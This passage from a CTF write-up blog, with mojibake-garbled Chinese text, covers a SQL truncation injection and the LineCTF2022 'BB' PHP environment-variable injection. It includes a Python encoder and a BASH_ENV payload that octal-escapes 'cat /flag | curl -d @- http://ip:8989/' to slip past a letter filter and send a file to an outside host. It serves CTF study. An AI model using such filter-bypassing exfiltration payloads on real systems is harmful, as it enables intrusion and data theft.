class="keyword">INSERT</span> <span class="keyword">INTO</span> products <span class="keyword">VALUES</span>(<span class="string">&#x27;whatsapp&#x27;</span>, sha256(....), ....);</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> products <span class="keyword">VALUES</span>(<span class="string">&#x27;oculus-rift&#x27;</span>, sha256(....), ....);</span><br></pre></td></tr></table></figure>

<p>åŸºäºçº¦æŸæ¡ä»¶çš„SQLæ³¨å…¥</p>
<p>å¦‚æœæˆ‘ä»¬æ’å…¥çš„åå­—åé¢åŠ ä¸Šè¶…è¿‡é™åˆ¶çš„ç©ºæ ¼ï¼Œåœ¨æ’å…¥çš„æ—¶å€™æ•°æ®åº“å°±ä¼šæŠŠæ•°æ®åé¢çš„ç©ºæ ¼åˆ æ‰</p>
<p>ä½¿å¾—å¯¹åº”çš„æ•°æ®çš„<code>secret</code>è¢«æ”¹å˜</p>
<p>é€šè¿‡æŸ¥è¯¢<code>facebook</code>å¾—åˆ°flag</p>
<h2 id="LineCTF2022-BB"><a href="#LineCTF2022-BB" class="headerlink" title="[LineCTF2022]BB"></a>[LineCTF2022]BB</h2><ul>
<li>ç¯å¢ƒå˜é‡æ³¨å…¥</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bye</span>(<span class="params"><span class="variable">$s</span>, <span class="variable">$ptn</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="variable">$ptn</span>, <span class="variable">$s</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_GET</span>[<span class="string">&quot;env&quot;</span>] <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(bye(<span class="variable">$k</span>, <span class="string">&quot;/=/i&quot;</span>) &amp;&amp; bye(<span class="variable">$v</span>, <span class="string">&quot;/[a-zA-Z]/i&quot;</span>)) &#123;</span><br><span class="line">            putenv(<span class="string">&quot;<span class="subst">&#123;$k&#125;</span>=<span class="subst">&#123;$v&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;imdude&#x27;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_GET</span>[<span class="string">&quot;env&quot;</span>] <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(bye(<span class="variable">$k</span>, <span class="string">&quot;/=/i&quot;</span>)) &#123;</span><br><span class="line">            putenv(<span class="string">&quot;<span class="subst">&#123;$k&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨æ³¨å…¥å…ˆå¾—å…ˆè¦ç»•è¿‡<code>preg_match</code>ï¼Œå¯ä»¥åˆ©ç”¨åå…­è¿›åˆ¶ç»•è¿‡</p>
<h4 id="åå…­è¿›åˆ¶ç»•è¿‡"><a href="#åå…­è¿›åˆ¶ç»•è¿‡" class="headerlink" title="åå…­è¿›åˆ¶ç»•è¿‡"></a>åå…­è¿›åˆ¶ç»•è¿‡</h4><p><a href="https://blog.csdn.net/RABCDXB/article/details/125351004">https://blog.csdn.net/RABCDXB/article/details/125351004</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat: $&#x27;\143\141\164&#x27; </span><br><span class="line">$&#x27;\143\141\164&#x27; poc.xml</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/3831a5523d6247899a1284b0b6e1ea34.png" alt="image-20220630101859350"></p>
<h4 id="ç¯å¢ƒå˜é‡æ³¨å…¥"><a href="#ç¯å¢ƒå˜é‡æ³¨å…¥" class="headerlink" title="ç¯å¢ƒå˜é‡æ³¨å…¥"></a>ç¯å¢ƒå˜é‡æ³¨å…¥</h4><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">æˆ‘æ˜¯å¦‚ä½•åˆ©ç”¨ç¯å¢ƒå˜é‡æ³¨å…¥æ‰§è¡Œä»»æ„å‘½ä»¤</a></p>
<p>å› ä¸ºæ²¡æœ‰ä¸Šä¼ ç‚¹ï¼Œæ‰€ä»¥ä¹Ÿä¸çŸ¥é“è¯¥æŠŠsoæ–‡ä»¶ä¸Šä¼ åˆ°å“ªé‡Œï¼Œæ‰€ä»¥å¾€åçœ‹ï¼Œåˆ©ç”¨<code>BASH_ENV</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;cat /flag | curl -d @- http://ip:8989/&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;$&#x27;&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> cmd:</span><br><span class="line">    <span class="keyword">if</span> a <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">        a = <span class="built_in">oct</span>(<span class="built_in">ord</span>(a))[<span class="number">2</span>:]</span><br><span class="line">        flag += <span class="string">&quot;\\&quot;</span> + a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += a</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># $&#x27;\143\141\164&#x27; /$&#x27;\146\154\141\147&#x27; | $&#x27;\143\165\162\154&#x27; -$&#x27;\144&#x27; @- $&#x27;\150\164\164\160&#x27;://ip:8989/</span></span><br></pre></td></tr></table></figure>

<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?env[BASH_ENV]=`$&#x27;\143\141\164&#x27; /$&#x27;\146\154\141\147&#x27; | $&#x27;\143\165\162\154&#x27; -$&#x27;\144&#x27; @- $&#x27;\150\164\164\160&#x27;://ip:8989/`</span><br></pre></td></tr></table></figure>



<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgiåè®®åˆ†æ &amp;&amp; PHP-FPMæœªæˆæƒè®¿é—®æ¼æ´ &amp;&amp; Expç¼–å†™</a></p>
<p><a href="https://blog.csdn.net/qq_51295677/article/details/124408615">[è“å¸½æ¯ 2021]One Pointer PHP</a></p>
<p><a href="https://blog.csdn.net/rfrder/article/details/121042290">åˆ©ç”¨pearcmd.phpä»LFIåˆ°getshell</a></p>
<p><a href="https://blog.csdn.net/weixin_43610673/article/details/122955159">https://blog.csdn.net/weixin_43610673/article/details/122955159</a></p>
<p><a href="https://xz.aliyun.com/t/10032#toc-12">https://xz.aliyun.com/t/10032#toc-12</a></p>
<p><a href="https://blog.csdn.net/SopRomeo/article/details/108967248">https://blog.csdn.net/SopRomeo/article/details/108967248</a></p>
<p><a href="https://blog.csdn.net/m0_49835838/article/details/122718372">https://blog.csdn.net/m0_49835838/article/details/122718372</a></p>
<p><a href="https://www.jianshu.com/p/73cd11d83c30">Apache POI XMLå¤–éƒ¨å®ä½“ï¼ˆXML External Entityï¼ŒXXEï¼‰æ”»å‡»è¯¦è§£ - ç®€ä¹¦ (jianshu.com)</a></p>
<p><a href="https://xz.aliyun.com/t/6628#toc-4">https://xz.aliyun.com/t/6628#toc-4</a></p>
<p><a href="https://blog.csdn.net/rfrder/article/details/116036092">https://blog.csdn.net/rfrder/article/details/116036092</a></p>
<p><a href="https://www.cnblogs.com/yokan/p/12650702.html">file_put_contentsåˆ©ç”¨æŠ€å·§(php://filteråè®®ï¼‰ - yokan - åšå®¢å›­ (cnblogs.com)</a></p>
<p><a href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a></p>
<p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
<p><a href="https://blog.csdn.net/RABCDXB/article/details/119654409">https://blog.csdn.net/RABCDXB/article/details/119654409</a></p>
<p><a href="https://blog.csdn.net/wlllllianqing/article/details/120274851">https://blog.csdn.net/wlllllianqing/article/details/120274851</a></p>
<p><a href="https://tttang.com/archive/1384/">https://tttang.com/archive/1384/</a></p>
]]></content>
      <categories>
        <category>é›†è®­</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buuåˆ·é¢˜</tag>
      </tags>
  </entry>
</search>
